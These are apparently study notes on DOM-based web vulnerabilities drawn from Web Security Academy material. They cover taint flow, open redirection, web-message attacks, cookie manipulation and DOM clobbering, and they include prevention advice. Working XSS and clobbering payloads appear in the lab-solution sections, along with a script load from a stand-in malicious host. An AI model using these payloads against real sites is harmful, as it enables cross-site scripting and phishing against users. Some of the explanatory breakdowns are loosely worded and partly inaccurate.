--------------------------
DOM-BASED VULNERABILITIES
--------------------------

The Document Object Model (DOM) is a web browser's hierarchical representation of the elements on the page. Websites can use JavaScript to manipulate the nodes and objects of the DOM, as well as their properties. DOM manipulation in itself is not a problem. In fact, it is an integral part of how modern websites work. However, JavaScript that handles data insecurely can enable various attacks. DOM-based vulnerabilities arise when a website contains JavaScript that takes an attacker-controllable value, known as a source, and passes it into a dangerous function, known as a sink. 

-----------------------------
TAINT-FLOW VULNERABILITIES:-
-----------------------------

Many DOM-based vulnerabilities can be traced back to problems with the way client-side code manipulates attacker-controllable data.

WHAT IS TAINT FLOW?
To either exploit or mitigate these vulnerabilities, it is important to first familiarize yourself with the basics of taint flow between sources and sinks.

Sources:-
A source is a JavaScript property that accepts data that is potentially attacker-controlled. An example of a source is the location.search property because it reads input from the query string, which is relatively simple for an attacker to control. Ultimately, any property that can be controlled by the attacker is a potential source. This includes the referring URL (exposed by the document.referrer string), the user's cookies (exposed by the document.cookie string), and web messages.

Sinks:-
A sink is a potentially dangerous JavaScript function or DOM object that can cause undesirable effects if attacker-controlled data is passed to it. For example, the eval() function is a sink because it processes the argument that is passed to it as JavaScript. An example of an HTML sink is document.body.innerHTML because it potentially allows an attacker to inject malicious HTML and execute arbitrary JavaScript.

Fundamentally, DOM-based vulnerabilities arise when a website passes data from a source to a sink, which then handles the data in an unsafe way in the context of the client's session.

The most common source is the URL, which is typically accessed with the location object. An attacker can construct a link to send a victim to a vulnerable page with a payload in the query string and fragment portions of the URL. Consider the following code:

goto = location.hash.slice(1)
if (goto.startsWith('https:')) {
  location = goto;
}

This is vulnerable to DOM-based open redirection because the location.hash source is handled in an unsafe way. If the URL contains a hash fragment that starts with https:, this code extracts the value of the location.hash property and sets it as the location property of the window. An attacker could exploit this vulnerability by constructing the following 
URL:- 
https://www.innocent-website.com/example#https://www.evil-user.net

When a victim visits this URL, the JavaScript sets the value of the location property to https://www.evil-user.net, which automatically redirects the victim to the malicious site. This behavior could easily be exploited to construct a phishing attack


COMMON SOURCES:-

The following are typical sources that can be used to exploit a variety of taint-flow vulnerabilities:
document.URL
document.documentURI
document.URLUnencoded
document.baseURI
location
document.cookie
document.referrer
window.name
history.pushState
history.replaceState
localStorage
sessionStorage
IndexedDB (mozIndexedDB, webkitIndexedDB, msIndexedDB)
Database

------------------------------------------------------------------------------------------------------------------------------------
WEB MESSAGE:-
------------------------------------------------------------------------------------------------------------------------------------

Controlling the web message source

In this section, we'll look at how web messages can be used as a source to exploit DOM-based vulnerabilities on the recipient page. We'll also describe how such an attack is constructed, including how common origin-verification techniques can often be bypassed.

If a page handles incoming web messages in an unsafe way, for example, by not verifying the origin of incoming messages correctly in the event listener, properties and functions that are called by the event listener can potentially become sinks. For example, an attacker could host a malicious iframe and use the postMessage() method to pass web message data to the vulnerable event listener, which then sends the payload to a sink on the parent page. This behavior means that you can use web messages as the source for propagating malicious data to any of those sinks.
What is the impact of DOM-based web message vulnerabilities?

The potential impact of the vulnerability depends on the destination document's handling of the incoming message. If the destination document trusts the sender not to transmit malicious data in the message, and handles the data in an unsafe way by passing it into a sink, then the joint behavior of the two documents may allow an attacker to compromise the user, for example.
How to construct an attack using web messages as the source

Consider the following code:
<script>
window.addEventListener('message', function(e) {
  eval(e.data);
});
</script>

This is vulnerable because an attacker could inject a JavaScript payload by constructing the following iframe:
<iframe src="//vulnerable-website" onload="this.contentWindow.postMessage('print()','*')">

As the event listener does not verify the origin of the message, and the postMessage() method specifies the targetOrigin "*", the event listener accepts the payload and passes it into a sink, in this case, the eval() function. 

LAB SOLUTION:-
<iframe src="https://0a5b003904096b1082bc97b3002000ca.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">

This code snippet demonstrates another example of a cross-site scripting (XSS) attack using an <iframe> and the postMessage method. Here’s a brief breakdown:

    <iframe>: Like before, this HTML element is used to embed another page within the current page.

    src Attribute: The src points to a specific web application. If this page is vulnerable, it could be exploited.

    onload Event: This attribute executes JavaScript when the iframe finishes loading.

    postMessage Method: This method allows for safe cross-origin communication between the iframe and the parent page. In this case, it sends a message to the iframe's window.

    <img src=1 onerror=print()>: This part of the message contains an image element with a deliberately incorrect source (src=1). When the image fails to load, it triggers the onerror event, executing the print() function, which opens the print dialog.
    
LAB SOLUTION:-
<iframe src="https://0a9a005d044777a9801c0812007800a3.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
This code snippet illustrates a method of executing JavaScript in an embedded iframe, again targeting potential XSS vulnerabilities. Here’s a breakdown:

    <iframe>: This tag embeds another webpage specified by the src attribute.

    src Attribute: The URL points to a specific web application, which may be vulnerable to XSS attacks.

    onload Event: This JavaScript executes when the iframe has fully loaded.

    postMessage Method: This allows the parent window to send messages to the iframe. In this case, it sends a message that attempts to execute JavaScript.

    'javascript:print()//http:': This string attempts to use the javascript: pseudo-protocol, which is often used to execute JavaScript in certain contexts. Here, it calls the print() function to open the print dialog. The //http: part appears to be a malformed URL but is likely included to ensure the message structure is accepted.

------------------------------------------------------------------------------------------------------------------------------------
ORIGIN VERIFICATION:-
------------------------------------------------------------------------------------------------------------------------------------

Even if an event listener does include some form of origin verification, this verification step can sometimes be fundamentally flawed. For example, consider the following code:
window.addEventListener('message', function(e) {
    if (e.origin.indexOf('normal-website.com') > -1) {
        eval(e.data);
    }
});

The indexOf method is used to try and verify that the origin of the incoming message is the normal-website.com domain. However, in practice, it only checks whether the string "normal-website.com" is contained anywhere in the origin URL. As a result, an attacker could easily bypass this verification step if the origin of their malicious message was http://www.normal-website.com.evil.net, for example.

The same flaw also applies to verification checks that rely on the startsWith() or endsWith() methods. For example, the following event listener would regard the origin http://www.malicious-websitenormal-website.com 

LAB SOLUTION:-

WEB SCRIPT:-            window.addEventListener('message', function(e) {
                            var iframe = document.createElement('iframe'), ACMEplayer = {element: iframe}, d;
                            document.body.appendChild(iframe);
                            try {
                                d = JSON.parse(e.data);
                            } catch(e) {
                                return;
                            }
                            switch(d.type) {
                                case "page-load":
                                    ACMEplayer.element.scrollIntoView();
                                    break;
                                case "load-channel":
                                    ACMEplayer.element.src = d.url;
                                    break;
                                case "player-height-changed":
                                    ACMEplayer.element.style.width = d.width + "px";
                                    ACMEplayer.element.style.height = d.height + "px";
                                    break;
                            }
                        }, false);
                    
PLAYLOAD:-<iframe src=https://0a93008b038a0b9080342bd500ea001e.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>

This code snippet involves using the postMessage API for cross-origin communication between a parent window and an embedded <iframe>. Here's a breakdown of how it works:
Breakdown of the Code

    window.addEventListener('message', ...): This sets up an event listener in the parent window that listens for messages sent to it from the iframe or other windows.

    Creating the Iframe: Inside the message event handler:
        An iframe is created dynamically and appended to the document body.
        An object ACMEplayer is created to hold the iframe element for easier manipulation.

    Parsing the Incoming Message:
        The code tries to parse the incoming message data as JSON. If parsing fails (likely due to malformed data), it simply returns and does nothing.

    Handling Different Message Types:
        The switch statement checks the type of message received (d.type):
            "page-load": Scrolls the iframe into view when the page is loaded.
            "load-channel": Changes the src attribute of the iframe to the provided URL.
            "player-height-changed": Adjusts the iframe's width and height based on the data received.

How the Iframe Works Here

    Iframe Usage: The provided iframe element:

    <iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>

        This iframe is set to load a specific URL. When the iframe finishes loading, it sends a message to its parent window containing a JSON object with the type load-channel and a URL that executes JavaScript.

Key Points

    Cross-Origin Communication: The postMessage method allows safe communication between different origins (e.g., between the iframe and the parent window) without running into cross-origin issues.

    Security Risks: Using javascript: URLs can be dangerous. If not properly validated, it can lead to XSS vulnerabilities, allowing potentially harmful scripts to execute.

    Dynamic Content: The parent window can dynamically respond to events occurring in the iframe, allowing for a more interactive and responsive user experience.
  
------------------------------------------------------------------------------------------------------------------------------------
WHICH SINKS CAN LEAD TO dom-BASED VULNERABILITIES?
------------------------------------------------------------------------------------------------------------------------------------

The following list provides a quick overview of common DOM-based vulnerabilities and an example of a sink that can lead to each one. For a more comprehensive list of relevant sinks, please refer to the vulnerability-specific pages by clicking the links below.
DOM-based vulnerability 	          Example sink
DOM XSS LABS 	                          document.write()
Open redirection LABS 	                  window.location
Cookie manipulation LABS 	          document.cookie
JavaScript injection 	                  eval()
Document-domain manipulation 	          document.domain
WebSocket-URL poisoning 	          WebSocket()
Link manipulation 	                  element.src
Web message manipulation 	          postMessage()
Ajax request-header manipulation       	  setRequestHeader()
Local file-path manipulation 	          FileReader.readAsText()
Client-side SQL injection 	          ExecuteSql()
HTML5-storage manipulation 	          sessionStorage.setItem()
Client-side XPath injection 	          document.evaluate()
Client-side JSON injection 	          JSON.parse()
DOM-data manipulation 	                  element.setAttribute()
Denial of service 	                  RegExp() 

HOW TO PREVENT DOM-BASED TAINT-FLOW VULNERABILITIES:-

There is no single action you can take to eliminate the threat of DOM-based attacks entirely. However, generally speaking, the most effective way to avoid DOM-based vulnerabilities is to avoid allowing data from any untrusted source to dynamically alter the value that is transmitted to any sink.

If the desired functionality of the application means that this behavior is unavoidable, then defenses must be implemented within the client-side code. In many cases, the relevant data can be validated on a whitelist basis, only allowing content that is known to be safe. In other cases, it will be necessary to sanitize or encode the data. This can be a complex task, and depending on the context into which the data is to be inserted, may involve a combination of JavaScript escaping, HTML encoding, and URL encoding, in the appropriate sequence.

For measures you can take to prevent specific vulnerabilities, please refer to the corresponding vulnerability pages linked from the table above.

------------------------------------------------------------------------------------------------------------------------------------
WHAT IS DOM-BASED OPEN REDIRECTION?
------------------------------------------------------------------------------------------------------------------------------------
DOM-based open-redirection vulnerabilities arise when a script writes attacker-controllable data into a sink that can trigger cross-domain navigation. For example, the following code is vulnerable due to the unsafe way it handles the location.hash property:
let url = /https?:\/\/.+/.exec(location.hash);
if (url) {
  location = url[0];
}

An attacker may be able to use this vulnerability to construct a URL that, if visited by another user, will cause a redirection to an arbitrary external domain.
What is the impact of DOM-based open redirection?

This behavior can be leveraged to facilitate phishing attacks against users of the website, for example. The ability to use an authentic application URL targeting the correct domain and with a valid TLS certificate (if TLS is used) lends credibility to the phishing attack because many users, even if they verify these features, will not notice the subsequent redirection to a different domain.

If an attacker is able to control the start of the string that is passed to the redirection API, then it may be possible to escalate this vulnerability into a JavaScript injection attack. An attacker could construct a URL with the javascript: pseudo-protocol to execute arbitrary code when the URL is processed by the browser. 

LAB SOLUTION:-


The blog post page contains the following link, which returns to the home page of the blog:
<a href='#' onclick='returnURL' = /url=https?:\/\/.+)/.exec(location); if(returnUrl)location.href = returnUrl[1];else location.href = "/"'>Back to Blog</a>

The url parameter contains an open redirection vulnerability that allows you to change where the "Back to Blog" link takes the user. To solve the lab, construct and visit the following URL, remembering to change the URL to contain your lab ID and your exploit server ID:
https://YOUR-LAB-ID.web-security-academy.net/post?postId=4&url=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/

WHICH SINKS CAN LEAD TO DOM-BASED OPEN-REDIRECTION VULNERABILITIES?

The following are some of the main sinks can lead to DOM-based open-redirection vulnerabilities:
location
location.host
location.hostname
location.href
location.pathname
location.search
location.protocol
location.assign()
location.replace()
open()
element.srcdoc
XMLHttpRequest.open()
XMLHttpRequest.send()
jQuery.ajax()
$.ajax()

------------------------------------------------------------------------------------------------------------------------------------
WHAT IS DOM-BASED COOKIE MANIPULATION?
------------------------------------------------------------------------------------------------------------------------------------
Some DOM-based vulnerabilities allow attackers to manipulate data that they do not typically control. This transforms normally-safe data types, such as cookies, into potential sources. DOM-based cookie-manipulation vulnerabilities arise when a script writes attacker-controllable data into the value of a cookie.

An attacker may be able to use this vulnerability to construct a URL that, if visited by another user, will set an arbitrary value in the user's cookie. Many sinks are largely harmless on their own, but DOM-based cookie-manipulation attacks demonstrate how low-severity vulnerabilities can sometimes be used as part of an exploit chain for a high-severity attack. For example, if JavaScript writes data from a source into document.cookie without sanitizing it first, an attacker can manipulate the value of a single cookie to inject arbitrary values:
document.cookie = 'cookieName='+location.hash.slice(1);

If the website unsafely reflects values from cookies without HTML-encoding them, an attacker can use cookie-manipulation techniques to exploit this behavior. 

LAB SOLUTION:-
<iframe src="https://0a7000b904a4d7c58150c069005d0077.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://0a7000b904a4d7c58150c069005d0077.web-security-academy.net';window.x=1;">

The code you provided is an example of an attempt to exploit a web security vulnerability, specifically a cross-site scripting (XSS) attack. Here’s a breakdown of its components:

    <iframe>: This HTML element is used to embed another HTML page within the current page. The src attribute specifies the URL of the page to embed.

    src Attribute: The URL includes a query parameter (productId=1), but it also contains an extra single quote (') followed by a <script> tag. This malformed URL is likely an attempt to inject malicious JavaScript code.

    <script>print()</script>: This script is intended to execute when the iframe loads. The print() function opens the print dialog for the current page.

    onload Event: This attribute triggers a JavaScript action when the iframe finishes loading. The code checks if window.x is not set; if not, it reassigns the src of the iframe, which could potentially lead to loading a different page or re-executing the script.

    Potential Exploit: The intention behind this code seems to be to manipulate the content loaded in the iframe or execute arbitrary JavaScript in the context of the loaded page, which could lead to security breaches such as data theft or unauthorized actions.
    
------------------------------------------------------------------------------------------------------------------------------------
WHAT IS THE IMPACT OF A DOM-BASED COOKIE-MANIPULATION ATTACK?
------------------------------------------------------------------------------------------------------------------------------------
The potential impact of this vulnerability depends on the role that the cookie plays within the website. If the cookie is used to control the behavior that results from certain user actions (for example, a production versus demo mode setting), then the attacker may be able to cause the user to perform unintended actions by manipulating the cookie's value.

If the cookie is used to track the user's session, then the attacker may be able to perform a session fixation attack, in which they set the cookie's value to a valid token that they have obtained from the website, and then hijack the session during the victim's subsequent interaction with the website. A cookie-manipulation vulnerability like this can be used to attack not only the vulnerable website, but any other website under the same parent domain. 

------------------------------------------------------------------------------------------------------------------------------------
WHAT IS DOM-BASED DOCUMENT-DOMAIN MANIPULATION?
------------------------------------------------------------------------------------------------------------------------------------
Document-domain manipulation vulnerabilities arise when a script uses attacker-controllable data to set the document.domain property. An attacker may be able to use the vulnerability to construct a URL that, if visited by another user, will cause the response page to set an arbitrary document.domain value.

The document.domain property is used by browsers in their enforcement of the same origin policy. If two pages from different origins explicitly set the same document.domain value, then those two pages can interact in unrestricted ways. If an attacker can cause a page of a targeted website and another page they control (either directly, or via an XSS-like vulnerability) to set the same document.domain value, then the attacker may be able to fully compromise the target page via the page they already control. This opens up the same possibilities for exploitation as regular cross-site scripting (XSS) vulnerabilities.

Browsers generally enforce some restrictions on the values that can be assigned to document.domain, and may prevent the use of completely different values than the actual origin of the page. However, there are two important caveats to this. Firstly, browsers allow the use of child or parent domains, so an attacker may be able to switch the domain of the target page to that of a related website with a weaker security posture. Secondly, some browser quirks enable switching to completely unrelated domains. These caveats mean that the ability to manipulate the document.domain property of a page generally represents a security vulnerability whose severity is not far behind regular XSS.
 
------------------------------------------------------------------------------------------------------------------------------------
WHAT IS DOM-BASED WEBSOCKET-URL POISONING?
------------------------------------------------------------------------------------------------------------------------------------
WebSocket-URL poisoning occurs when a script uses controllable data as the target URL of a WebSocket connection. An attacker may be able to use this vulnerability to construct a URL that, if visited by another user, will cause the user's browser to open a WebSocket connection to a URL that is under the attacker's control.
What is the impact of WebSocket-URL poisoning?

The potential impact of WebSocket-URL poisoning depends on how the website uses WebSockets. If the website transmits sensitive data from the user's browser to the WebSocket server, then the attacker may be able to capture this data.

If the application reads data from the WebSocket server and processes it in some way, the attacker may be able to subvert the website's logic or deliver client-side attacks against the user.
 
------------------------------------------------------------------------------------------------------------------------------------
WHAT IS DOM-BASED LINK MANIPULATION?
------------------------------------------------------------------------------------------------------------------------------------

DOM-based link-manipulation vulnerabilities arise when a script writes attacker-controllable data to a navigation target within the current page, such as a clickable link or the submission URL of a form. An attacker might be able to use this vulnerability to construct a URL that, if visited by another application user, will modify the target of links within the response.

WHAT IS THE IMPACT OF A DOM-BASED LINK-MANIPULATION ATTACK?

An attacker may be able to leverage this vulnerability to perform various attacks, including:

    Causing the user to be redirected to an arbitrary external URL, which could facilitate a phishing attack.
    Causing the user to submit sensitive form data to a server controlled by the attacker.
    Changing the file or query string associated with a link, causing the user to perform an unintended action within the application.
    Bypassing browser anti-XSS defenses by injecting on-site links containing XSS exploits. This works because anti-XSS defenses do not typically account for on-site links.

WHICH SINKS CAN LEAD TO DOM-BASED LINK-MANIPULATION VULNERABILITIES?

The following are some of the main sinks can lead to DOM-based link-manipulation vulnerabilities:
element.href
element.src
element.action

------------------------------------------------------------------------------------------------------------------------------------
WHAT IS DOM-BASED WEB MESSAGE MANIPULATION?
------------------------------------------------------------------------------------------------------------------------------------
Web message vulnerabilities arise when a script sends attacker-controllable data as a web message to another document within the browser. An attacker may be able to use the web message data as a source by constructing a web page that, if visited by a user, will cause the user's browser to send a web message containing data that is under the attacker's control. For more information about the using web messages as a source.

Which sinks can lead to DOM-based web-message manipulation vulnerabilities?

The postMessage() method for sending web messages can lead to vulnerabilities if the event listener for receiving messages handles the incoming data in an unsafe way. 

------------------------------------------------------------------------------------------------------------------------------------
Ajax request-header manipulation
------------------------------------------------------------------------------------------------------------------------------------

In this section, we'll look at what DOM-based Ajax request-header manipulation is, talk about the potential impact of this kind of attack, and suggest ways to reduce your exposure to Ajax request-header manipulation vulnerabilities.
What is DOM-based Ajax request-header manipulation?

Using Ajax enables a website to make asynchronous requests to the server so that web applications can dynamically change content on the page without the need to reload the entire page. However, Ajax request-header manipulation vulnerabilities arise when a script writes attacker-controllable data into the request header of an Ajax request that is issued using an XmlHttpRequest object. An attacker may be able to use this vulnerability to construct a URL that, if visited by another user, will set an arbitrary header in the subsequent Ajax request. This can then be used as a starting point to chain together other kinds of attack, thereby increasing the potential severity of this vulnerability.
What is the impact of DOM-based Ajax request-header manipulation?

The potential impact of the vulnerability depends on the role of specific HTTP headers in the server-side processing of the Ajax request. If the header is used to control the behavior that results from the Ajax request, the attacker may be able to cause the user to perform unintended actions by manipulating the header. The impact also depends on what exactly the attacker is able to inject into the headers.
Which sinks can lead to DOM-based Ajax request-header manipulation vulnerabilities?

The following are some of the main sinks can lead to DOM-based Ajax request-header vulnerabilities:
XMLHttpRequest.setRequestHeader()
XMLHttpRequest.open()
XMLHttpRequest.send()
jQuery.globalEval()
$.globalEval()

------------------------------------------------------------------------------------------------------------------------------------
LOCAL FILE-PATH MANIPULATION
------------------------------------------------------------------------------------------------------------------------------------

In this section, we'll talk about what DOM-based local file-path manipulation is, look at the potential impact of an attack, highlight some of the sinks that can lead to this kind of vulnerability, and suggest ways that you can reduce your exposure.
What is DOM-based local file-path manipulation?

Local file-path manipulation vulnerabilities arise when a script passes attacker-controllable data to a file-handling API as the filename parameter. An attacker may be able to use this vulnerability to construct a URL that, if visited by another user, will cause the user's browser to open an arbitrary local file.
What is the impact of DOM-based local file-path manipulation?

The potential impact of this vulnerability depends on how the website uses the opened file:

    If the website reads data from the file, the attacker may be able to retrieve this data.
    If the website writes specific data to a sensitive file, the attacker may also be able write their own data to the file, which could be the configuration file of the operating system, for example.

In both of these cases, the actual exploitability of the potential vulnerability may depend on other suitable functionality being present on the website.
Which sinks can lead to DOM-based local file-path manipulation vulnerabilities?

The following are some of the main sinks can lead to DOM-based local file path manipulation vulnerabilities:
FileReader.readAsArrayBuffer()
FileReader.readAsBinaryString()
FileReader.readAsDataURL()
FileReader.readAsText()
FileReader.readAsFile()
FileReader.root.getFile()

------------------------------------------------------------------------------------------------------------------------------------
CLIENT-SIDE SQL INJECTION
------------------------------------------------------------------------------------------------------------------------------------

In this section, we'll discuss what DOM-based client-side SQL injection is, describe how an attacker can exploit this vulnerability, and suggest ways to reduce your exposure to this kind of attack.
What is DOM-based client-side SQL injection?

Client-side SQL-injection vulnerabilities arise when a script incorporates attacker-controllable data into a client-side SQL query in an unsafe way. An attacker may be able to use this vulnerability to construct a URL that, if visited by another user, will execute an arbitrary SQL query within the local SQL database of the user's browser.
What is the impact of DOM-based client-side SQL injection?

The potential impact of the vulnerability depends on the website's usage of the SQL database. If the database is used to store sensitive data, such as messages on a social network, the attacker may be able to retrieve this data.

If the database is used to store pending user actions, such as outgoing messages in an email application, then the attacker may be able to modify this data and perform arbitrary actions on the user's behalf.
Which sinks can lead to DOM-based client-side SQL-injection vulnerabilities?

The JavaScript database function executeSql() can lead to client-side SQL-injection vulnerabilities.
How to prevent DOM-based client-side SQL-injection vulnerabilities

In addition to the general measures described on the DOM-based vulnerabilities page, you should make sure that you use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to safely incorporate potentially tainted data into SQL queries:

    The application specifies the structure of the query, leaving placeholders for each item of user input.
    The application specifies the contents of each placeholder. As the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure.

In the JavaScript executeSql() API, parameterized items can be designated within the query string using the query character ?. For each parameterized item, an additional parameter is passed to the API containing the item's value. To prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application, it is strongly recommended that you parameterize every variable data item that is incorporated into database queries, even if it is not obviously tainted.

------------------------------------------------------------------------------------------------------------------------------------
DOM-based HTML5-storage manipulation
------------------------------------------------------------------------------------------------------------------------------------

In this section, we'll look at HTML5-storage manipulation using the DOM, point out potentially dangerous sinks that can be used as part of this kind of attack, and suggest ways to reduce your exposure to HTML5-storage manipulation.
What is DOM-based HTML5-storage manipulation?

HTML5-storage manipulation vulnerabilities arise when a script stores attacker-controllable data in the HTML5 storage of the web browser (either localStorage or sessionStorage). An attacker may be able to use this behavior to construct a URL that, if visited by another user, will cause the user's browser to store attacker-controllable data.

This behavior does not in itself constitute a security vulnerability. However, if the application later reads data back from storage and processes it in an unsafe way, an attacker may be able to leverage the storage mechanism to deliver other DOM-based attacks, such as cross-site scripting and JavaScript injection.
Which sinks can lead to DOM-based HTML5-storage manipulation vulnerabilities?

The following are some of the main sinks that can lead to DOM-based HTML5-storage manipulation vulnerabilities:
sessionStorage.setItem()
localStorage.setItem()

------------------------------------------------------------------------------------------------------------------------------------
DOM-based client-side XPath injection
------------------------------------------------------------------------------------------------------------------------------------

In this section, we'll look at what DOM-based XPath-injection is, discuss the potential impact of this kind of vulnerability, and suggest ways to reduce your exposure to them.
What is DOM-based XPath injection?

DOM-based XPath-injection vulnerabilities arise when a script incorporates attacker-controllable data into an XPath query. An attacker may be able to use this behavior to construct a URL that, if visited by another application user, will trigger the execution of an arbitrary XPath query, which could cause different data to be retrieved and processed by the website.
What is the impact of DOM-based XPath injection?

Depending on the purpose for which the query results are used, it may be possible for the attacker to subvert the website's logic or cause unintended actions on behalf of the user.
Which sinks can lead to XPath-injection vulnerabilities?

The following are some of the main sinks that can lead to DOM-based XPath-injection vulnerabilities:
document.evaluate()
element.evaluate()

------------------------------------------------------------------------------------------------------------------------------------
DOM-based client-side JSON injection
------------------------------------------------------------------------------------------------------------------------------------

In this section, we'll describe client-side JSON injection as related to the DOM, look at how damaging such an attack could be, and suggest ways to reduce your exposure to this kind of vulnerability.
What is DOM-based JSON injection?

DOM-based JSON-injection vulnerabilities arise when a script incorporates attacker-controllable data into a string that is parsed as a JSON data structure and then processed by the application. An attacker may be able to use this behavior to construct a URL that, if visited by another user, will cause arbitrary JSON data to be processed.
What is the impact of a DOM-based JSON-injection attack?

Depending on the purpose for which this data is used, it may be possible for an attacker to subvert the website's logic, or cause unintended actions on behalf of another user.
Which sinks can lead to DOM-based JSON-injection vulnerabilities?
JSON.parse()
jQuery.parseJSON()
$.parseJSON()

------------------------------------------------------------------------------------------------------------------------------------
DOM-DATA MANIPULATION
------------------------------------------------------------------------------------------------------------------------------------
In this section, we'll look at what DOM-data manipulation is, discuss the potential impact of this kind of attack, and look at ways to reduce your exposure to DOM-data manipulation vulnerabilities.
What is DOM-data manipulation?

DOM-data manipulation vulnerabilities arise when a script writes attacker-controllable data to a field within the DOM that is used within the visible UI or client-side logic. An attacker may be able to use this vulnerability to construct a URL that, if visited by another user, will modify the appearance or behavior of the client-side UI. DOM-data manipulation vulnerabilities can be exploited by both reflected and stored DOM-based attacks.
What is the impact of DOM-data manipulation?

At the lesser end of the scale, an attacker may be able to leverage this vulnerability to perform virtual defacement of the website, such as changing text or images that are displayed on a particular page. However, attacks can be more severe. For example, if the attacker is able to change the src property of an element, they could potentially induce the user to perform unintended actions by importing a malicious JavaScript file.
Which sinks can lead to DOM-data manipulation vulnerabilities?

The following are some of the main sinks that can lead to DOM-data manipulation vulnerabilities:
script.src
script.text
script.textContent
script.innerText
element.setAttribute()
element.search
element.text
element.textContent
element.innerText
element.outerText
element.value
element.name
element.target
element.method
element.type
element.backgroundImage
element.cssText
element.codebase
document.title
document.implementation.createHTMLDocument()
history.pushState()
history.replaceState()

How to prevent DOM-data manipulation vulnerabilities

In addition to the general measures described on the DOM-based vulnerabilities page, you should avoid allowing data from any untrusted source to be dynamically written to DOM-data fields. Note that Burp Suite automatically identifies this issue using static code analysis, which may lead to false positives that are not actually exploitable. The relevant code and execution paths should be reviewed to determine whether this vulnerability is indeed present, or whether mitigations are in place that would prevent exploitation.

------------------------------------------------------------------------------------------------------------------------------------
DOM-BASED DENIAL OF SERVICE
------------------------------------------------------------------------------------------------------------------------------------

In this section, we'll describe DOM-based denial-of-service vulnerabilities, look at which sinks can lead to this kind of vulnerability, and discuss ways to reduce your exposure to DOM-based DOS attacks.
What is DOM-based denial of service?

DOM-based denial-of-service vulnerabilities arise when a script passes attacker-controllable data in an unsafe way to a problematic platform API, such as an API whose invocation can cause the user's computer to consume excessive amounts of CPU or disk space. This may result in side effects if the browser restricts the functionality of the website, for example, by rejecting attempts to store data in localStorage or killing busy scripts.
Which sinks can lead to DOM-based denial-of-service vulnerabilities?

The following are some of the main sinks can lead to DOM-based denial-of-service vulnerabilities:
requestFileSystem()
RegExp()

------------------------------------------------------------------------------------------------------------------------------------
DOM CLOBBERING
------------------------------------------------------------------------------------------------------------------------------------

In this section, we will describe what DOM clobbering is, demonstrate how you can exploit DOM vulnerabilities using clobbering techniques, and suggest ways you can reduce your exposure to DOM clobbering attacks.
What is DOM clobbering?

DOM clobbering is a technique in which you inject HTML into a page to manipulate the DOM and ultimately change the behavior of JavaScript on the page. DOM clobbering is particularly useful in cases where XSS is not possible, but you can control some HTML on a page where the attributes id or name are whitelisted by the HTML filter. The most common form of DOM clobbering uses an anchor element to overwrite a global variable, which is then used by the application in an unsafe way, such as generating a dynamic script URL.

The term clobbering comes from the fact that you are "clobbering" a global variable or property of an object and overwriting it with a DOM node or HTML collection instead. For example, you can use DOM objects to overwrite other JavaScript objects and exploit unsafe names, such as submit, to interfere with a form's actual submit() function.
How to exploit DOM-clobbering vulnerabilities

A common pattern used by JavaScript developers is:
var someObject = window.someObject || {};

If you can control some of the HTML on the page, you can clobber the someObject reference with a DOM node, such as an anchor. Consider the following code:
<script>
    window.onload = function(){
        let someObject = window.someObject || {};
        let script = document.createElement('script');
        script.src = someObject.url;
        document.body.appendChild(script);
    };
</script>

To exploit this vulnerable code, you could inject the following HTML to clobber the someObject reference with an anchor element:
<a id=someObject><a id=someObject name=url href=//malicious-website.com/evil.js>

As the two anchors use the same ID, the DOM groups them together in a DOM collection. The DOM clobbering vector then overwrites the someObject reference with this DOM collection. A name attribute is used on the last anchor element in order to clobber the url property of the someObject object, which points to an external script. 

 Another common technique is to use a form element along with an element such as input to clobber DOM properties. For example, clobbering the attributes property enables you to bypass client-side filters that use it in their logic. Although the filter will enumerate the attributes property, it will not actually remove any attributes because the property has been clobbered with a DOM node. As a result, you will be able to inject malicious attributes that would normally be filtered out. For example, consider the following injection:
<form onclick=alert(1)><input id=attributes>Click me

In this case, the client-side filter would traverse the DOM and encounter a whitelisted form element. Normally, the filter would loop through the attributes property of the form element and remove any blacklisted attributes. However, because the attributes property has been clobbered with the input element, the filter loops through the input element instead. As the input element has an undefined length, the conditions for the for loop of the filter (for example i<element.attributes.length) are not met, and the filter simply moves on to the next element instead. This results in the onclick event being ignored altogether by the filter, which subsequently allows the alert() function to be called in the browser. 

lab solution:-


    Go to one of the blog posts and create a comment containing the following anchors:
    <a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">
    Return to the blog post and create a second comment containing any random text. The next time the page loads, the alert() is called.

The page for a specific blog post imports the JavaScript file loadCommentsWithDomPurify.js, which contains the following code:
let defaultAvatar = window.defaultAvatar || {avatar: '/resources/images/avatarDefault.svg'}

The defaultAvatar object is implemented using this dangerous pattern containing the logical OR operator in conjunction with a global variable. This makes it vulnerable to DOM clobbering.

You can clobber this object using anchor tags. Creating two anchors with the same ID causes them to be grouped in a DOM collection. The name attribute in the second anchor contains the value "avatar", which will clobber the avatar property with the contents of the href attribute.

Notice that the site uses the DOMPurify filter in an attempt to reduce DOM-based vulnerabilities. However, DOMPurify allows you to use the cid: protocol, which does not URL-encode double-quotes. This means you can inject an encoded double-quote that will be decoded at runtime. As a result, the injection described above will cause the defaultAvatar variable to be assigned the clobbered property {avatar: ‘cid:"onerror=alert(1)//’} the next time the page is loaded.

When you make a second post, the browser uses the newly-clobbered global variable, which smuggles the payload in the onerror event handler and triggers the alert().

lab solution:-


    Go to one of the blog posts and create a comment containing the following HTML:
    <form id=x tabindex=0 onfocus=print()><input id=attributes>

    Go to the exploit server and add the following iframe to the body:
    <iframe src=https://YOUR-LAB-ID.web-security-academy.net/post?postId=3 onload="setTimeout(()=>this.src=this.src+'#x',500)">

    Remember to change the URL to contain your lab ID and make sure that the postId parameter matches the postId of the blog post into which you injected the HTML in the previous step.
    Store the exploit and deliver it to the victim. The next time the page loads, the print() function is called.

